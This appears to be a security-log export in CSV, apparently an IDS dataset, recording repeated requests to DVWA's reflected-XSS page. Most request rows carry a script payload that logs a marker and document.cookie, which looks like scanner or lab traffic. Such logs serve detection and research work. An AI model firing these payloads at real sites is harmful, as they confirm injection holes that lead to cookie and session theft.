ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CTV00AALG13X1W2GXOQG5TP8ZPE134Y9SXT8JSDLUN4XXY03AX');console.log(document.cookie);</script>&user_token=6d39f07ab4c0ee47d4728edd940b2197
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('AZ3CU09YAQ5B8AR9JC6Q17UW9K03BI35ZK9PB9R84UI3XWSJHQ');console.log(document.cookie);</script>&user_token=62a82e5bad0fd2ee10bd6af4c3c900e1
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('QXYDQ3QMJK8HPT8CS6FQTNTKNQ0UD0ETOXR1AK459O88UIJRMB');console.log(document.cookie);</script>&user_token=d4ce6b04debe6953e82a314f29a19e32
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('PTSXGSOABY65FZACI8E1PMIMJOAINLRV1UZ0Q2HA4CNYLIXTYT');console.log(document.cookie);</script>&user_token=09eef1146991720e5002761b116e9fc9
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('OQINCL0KYN635CGKZTT8J478X7CM0N0YUHVB7KOZLDFMCBKEO3');console.log(document.cookie);</script>&user_token=21a752115c1240b030b08a6c847b62e4
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4T77S90K4SXSFEMR4BSSV58ZVMFNYUHR6TTKZGPX36IHUQLV5M');console.log(document.cookie);</script>&user_token=e8b252b1d74b8ce5fad37f04bb38fb0d
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('MSB7D199Z30713911O4L1GFSU8LM5NZZ2S4WC3XIZL4FXA7G1J');console.log(document.cookie);</script>&user_token=5372d17eefc86a8e6357491aace883c8
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778104,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('GHOP0FEVMP8PKUAXJVQ9ATYM15VPZ5GC2ZOSBU2CJL3QO54YNG');console.log(document.cookie);</script>&user_token=ce21a9fd283e170efd6340c01e0247e2
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('31OBQLE1HXEGVT3HXFJNFENKG2TVN48IB4FX8D6G91QZWN1NHS');console.log(document.cookie);</script>&user_token=b8477a13cb480c157263ac29505ec10b
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('N5GQGOJTC6MWN52U7D34HNGMX6K05DHXVROMAOFVSD0JXGGFJ5');console.log(document.cookie);</script>&user_token=5b103cc9bfe565c88d7cd9902db8e0b7
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4KP7JT8P536MG9CLG0XN6TLH6J2CY5P99V4Y6XFMHQSBHCFE1D');console.log(document.cookie);</script>&user_token=5caea4ce2da464dfe1775fa3a58ea79d
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3Z8GO0QCUMIAFMBB3JNFL11JOUKNYRMFQ3QXE661QDXS7EZAA5');console.log(document.cookie);</script>&user_token=ccd9e97fc40004abcd4b43c3ce4f7c34
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('J1OXWGAQI3452IKXPHES881TVT7TT58XM70I3VRHKXX0FO7ELC');console.log(document.cookie);</script>&user_token=e1be6c64a748e509bdd51f6fbe619cdb
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('FOMDNZLISZ93Z5N4WQRTNG3OEENL5IH5VQDSSUW24NBPZ3EPKG');console.log(document.cookie);</script>&user_token=fb7439c108b164b29feacca4f26180a6
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('Q43A1878MB5H8O6K2PL1Y51CS1XY0I6STU945RUGTBHDUPUOQW');console.log(document.cookie);</script>&user_token=97d618ed1e4b02a4c589eabdd4ee5f28
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('RJUCOR3DRALGJOXMHILGFFCCV5ED7Q1QRNSHH9PO6Y24PWIR6K');console.log(document.cookie);</script>&user_token=76a4d59dc95506e109b0908aa17d5d36
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('A1AJYPN0U1K4U9PKL7LDFLZ8AX3BJDG1FFKZ5AD668QMSB4CRL');console.log(document.cookie);</script>&user_token=2eccb83b49e921393891f99a64586c76
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('D746TS2FIUHNFR91G4TUGXHJLYRABOWSHR83VGHNVINCKXT3WD');console.log(document.cookie);</script>&user_token=fe40d6fe7c3f254eb0a16e7bb315ee82
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('7ETIE2VVML4TYXZPFJSSJ41KB7ZMK6C4MBM7B7G306OTS3CGWW');console.log(document.cookie);</script>&user_token=00bb7be14084f02a3005770995bbcbdb
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8RTBVG6IAUHPRD54FBYCU186YR7T9JYAMWSITAK0HC71WTJWLT');console.log(document.cookie);</script>&user_token=9f299810aa6601a5f1e879027bbed484
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('2WVG9T4JRWWK0N1GUX9WPYINZ7534RCFJGCYTWTMUW1B3ACD8Z');console.log(document.cookie);</script>&user_token=f890d2674dc924c64ab070af51c75087
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('RK62IOL7HKCQ1L98X448H4WC1CO4Z7BY51YAIXBH30SQRW108C');console.log(document.cookie);</script>&user_token=74f2cb0001e8825087ae8fb4ea457689
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3YKXM6REZ2HDZZS5YF9R2M4AZ632V0BEKYAF8NR12JI5355PPJ');console.log(document.cookie);</script>&user_token=75da87d8fc9b69e98fe1103501a6c080
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('IU6ASQ06RZZTC1W7YR8IOPEYI60BTNDP948K558PY2X2R9B82D');console.log(document.cookie);</script>&user_token=ec2d962bab1b2b80388f3bafd6046095
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('IPPZ1J9YYF4S6OUO2KJGMJIOY60Z4EK8HIBAL2U5YI69D0QQ49');console.log(document.cookie);</script>&user_token=3639e3bfdf18e7914bd57802a201eae4
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('SUEL1U902O5TN4XXMWJLHPN6J4FJFXM0XXC5VVZQTK99E4ZBED');console.log(document.cookie);</script>&user_token=acded5c26c9ea887755d2b456fcc8744
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('U9UMAYVJMSJ3976L4T9PKLIBZ3UIYHEL6AQHI9IAGSFE88QZVJ');console.log(document.cookie);</script>&user_token=0c0b38f5e27ed1c8155634336c340509
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VZQKOV9X98QLIXEVPOXPM1OMRW3Q5OTTOB70YFESFHBDZ0FJW2');console.log(document.cookie);</script>&user_token=7faed6d30adfc78595a65b8ae15efbef
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('5T3WN0ZMSHENE2D9UHW2L8OWVXC8UVXJDOFXVB0XMPJOJQ5D6R');console.log(document.cookie);</script>&user_token=1e511b439e1a199fc856211edbdec565
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('64PE7ECABIUO3IZVG1AT05Z8MHZTYYZL18A62RMQ8GHE6EU34D');console.log(document.cookie);</script>&user_token=1da54869728e94e5eb86f2b26d800490
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('NC4G4NVTRGHJS86L7ZLXDIEWXEUPG9IS1TQ9P0ONZNI4BOBUJF');console.log(document.cookie);</script>&user_token=9e13fc8ed481c609b28f7c4379437e32
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('IYPHIBWNC8IM8URAMRZJXKEUOZXV59685QVVYDG2HT4C4OWTYB');console.log(document.cookie);</script>&user_token=9224fe00a18c30fc341640cce1c0f3e3
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('DBS2BGT5WXDE63048OUZQ8QLM61OWRUHUCC6DA5022J1VQ5AUC');console.log(document.cookie);</script>&user_token=557452817b7e982e7d55b7cb8d8297c4
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UH9ON65L8FO0XBHV0Q9CTOLQIVNGQF5DCSTJH74ACF8EKLRM5C');console.log(document.cookie);</script>&user_token=202534c502a41756c6a08ab08e9d8d57
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UDZ8TAVGA1C2YN8CNTCEUF43UYR4T0IL5DB76PE3RLE18A04P4');console.log(document.cookie);</script>&user_token=b246dffab2c4ea83e8a74687a77a6e87
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('07ZQEVUZFVKITFB21HVOK3M65I5GQILGP1W8FROWQBTN2IFTEA');console.log(document.cookie);</script>&user_token=79bb4262c9055785ab90683b61c5dc76
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8AUB6Q1FCMKUVP8KLST16UVWXD6ZDDOXXZOKDGMBX2ZK2L7J8Z');console.log(document.cookie);</script>&user_token=76975623e0331f12039d376003d47836
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4LOCLF0AOWWFV72K0V7P9UJTO86IVNH2J4G5JUGUHZ7GYBIWZ6');console.log(document.cookie);</script>&user_token=b28e01975223842873da7eb647953a21
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('47G7TLUN72AXOZZNIHTOMJMXGKF4B0HIT25NFUFCXRO5KVR0BT');console.log(document.cookie);</script>&user_token=16573317854c318ef925202a194e4e22
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('QSSAV8UAI1FDFB5J80UPAH84RWGGYIFGJDRXWDFWGIGK3QPNYF');console.log(document.cookie);</script>&user_token=c4435d342ff0e2bba94dad79aed63f8c
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('Z6O67D923GYUK24QVGIYN6HJXQTSTBG12KVAX5NJMGCJFFWYT8');console.log(document.cookie);</script>&user_token=1c1d6140bc661d4d428bac150b21b2e7
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('Q68EBJVW26RDSYQPWT8IZMPPKBPLHKDQ6QRA8AU5K4C2PKJS3H');console.log(document.cookie);</script>&user_token=1a9a9b2ccbfbe532e03ce58deabf70ad
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('FLC6Q1K0968EPF7LNLRROUR4V6ZME6WULS6CFAC5GC46EW6YH9');console.log(document.cookie);</script>&user_token=1caf2f9887fd5a675b16ccadafe569ce
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('0RSDCVAJ0YANZP7T24080J9HFMKRAY1JQLLB6Q5K401ZPMWX52');console.log(document.cookie);</script>&user_token=65d0d99cddf2d7e4ecfdffaafb91b0ba
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XAV47IGOFRDE6NMGEX79393WIJNSW1MUW3FRRUQ4AEAF9XREFT');console.log(document.cookie);</script>&user_token=0ae9cf2f8dd3fede3ec7759d97e7b036
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WWATPVNC4DB165TH6C4B6AA41ITOV91PVJNF4XHNVGTZXMS9DN');console.log(document.cookie);</script>&user_token=e5cce29f057a51aeeb2165cc5d633925
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('1A7C9KM1W740UPLFROQ5BQEI3OUNL45JPNAEZR40SPWUV4Q1TP');console.log(document.cookie);</script>&user_token=a66a7ed0121112503337fa20f7053e7f
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CBK62JAS74LGKKWXRAQKH9SMQMQL3Y1XFHKIWYZ17VABHQFUQ2');console.log(document.cookie);</script>&user_token=29acb22912ad1d190c6f3639bb303f45
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('TWP8TNV2I4RMGVEB3EAQPQ7PR5LVVQO5CXTE7UALHUS9VI2BIX');console.log(document.cookie);</script>&user_token=ddd432928cab5293891bc211c96dbd06
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BSDR8OHTD4XCA2664GH3410PWR2C8JSO6XH0E8XPLWPUGT09C4');console.log(document.cookie);</script>&user_token=0c98b3e91b4a7245d058a3ee963889f0
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CQUORWFPB8BMXSK105ECYR0KYY38G314YQVZIMALG5FDYQN5F5');console.log(document.cookie);</script>&user_token=081332d3c5f7621ad1200506fd92b49e
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('OH9EWVFZUPOTWOZ4Y7T3Q63SUXDIGAGI3IM0XRK464EI717B8S');console.log(document.cookie);</script>&user_token=dbd9fc01d83d736746eaa800cc11ca41
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('2IUMN30YAWLNCE18341691PUUBPW5TW96BQIUVSBVFQ6VFLIIJ');console.log(document.cookie);</script>&user_token=62fe41a61276bec3fce38cd00ea73e8d
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('KMUPR04VGZE4R9MO4NZKJ8S64CP308HXRQFUR1Z4RYXUZ1O7CE');console.log(document.cookie);</script>&user_token=20dea0c6145798535c1c12a5545d91f5
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('T035VXB66BI0UPO7R4IN4UN8BH6YL9XBMGJ1YAYUULZ79DJWP4');console.log(document.cookie);</script>&user_token=9bc00bb8381d510271ee4679af330321
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('KWABUREZ4Z5R2FSS1LY6YNSLDTTTIKFWNPS08IOY0IAXZ7T3HB');console.log(document.cookie);</script>&user_token=22bd3c7f2f6a371befb76aa2eb7d1c5c
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VVUULRXBVVG8R5UKK5QXM6VHJC764X5WFZ25ALNKE3FYWZYTUD');console.log(document.cookie);</script>&user_token=5e5dd864afcf76ac3c1ae3ec434d2ece
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('LUN4N46T1S390JR3K8ZR4Z5DBVNAH07L5XMCFD5JQ4JEO18GCB');console.log(document.cookie);</script>&user_token=5a4db1db7f44362ea5bfe034f861a985
9999,778501,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779488,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('OHDGS7LXCUL6OG76YDPZCH01OVEN9XGKSMKXK98DTQ7VSWQVPQ');console.log(document.cookie);</script>&user_token=7fe14cd098b209c98782132ecb689b6d
9999,779488,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779488,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UUH06NN6GH6GFNMPQOZUUI8KJR762L4Q466OVG9BR3ZDMIHXRB');console.log(document.cookie);</script>&user_token=88581b396ea58d4bafa66cbdb345b9ca
9999,779488,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779488,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('ILB9I3AB5NNQCL36AEWPQH4UGW88KDUEB862RZSMWX2CXWP6U2');console.log(document.cookie);</script>&user_token=5a71576c071b5fc72b5e5550b8b20dea
9999,779488,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
